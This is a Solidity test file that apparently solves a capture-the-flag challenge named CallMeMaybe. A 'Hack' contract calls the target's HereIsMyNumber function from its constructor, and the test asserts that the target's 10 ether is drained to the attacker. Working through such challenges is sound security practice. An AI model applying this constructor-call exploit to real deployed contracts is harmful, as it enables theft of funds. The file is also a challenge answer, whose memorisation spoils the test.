// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {console} from "../../utils/Console.sol";
import {DSTest} from "ds-test/test.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {Vm} from "forge-std/Vm.sol";

import {CallMeMaybe} from "../CallMeMaybe.sol";

contract Hack {
    CallMeMaybe private cmm;

    constructor(CallMeMaybe _cmm) {
        cmm = _cmm;
        cmm.HereIsMyNumber();
    }

    receive() external payable {}
}

contract CallMeMaybeTest is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);
    uint256 internal constant CONTRACT_ETHER = 10 ether;
    uint256 internal constant USER_ETHER = 1 ether;
    Utilities internal utils;
    address payable internal attacker;

    CallMeMaybe internal cmm;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");
        vm.deal(address(attacker), USER_ETHER);

        cmm = new CallMeMaybe();
        vm.label(address(cmm), "CallMeMaybe");
        vm.deal(address(cmm), CONTRACT_ETHER);

        assertEq(address(attacker).balance, USER_ETHER);
        assertEq(address(cmm).balance, CONTRACT_ETHER);
    }

    function testExploit() public {
        Hack hack = new Hack(cmm);
        SafeTransferLib.safeTransferETH(
            address(attacker),
            address(hack).balance
        );
        assertEq(address(attacker).balance, CONTRACT_ETHER + USER_ETHER);
        assertEq(address(cmm).balance, 0);
    }
}
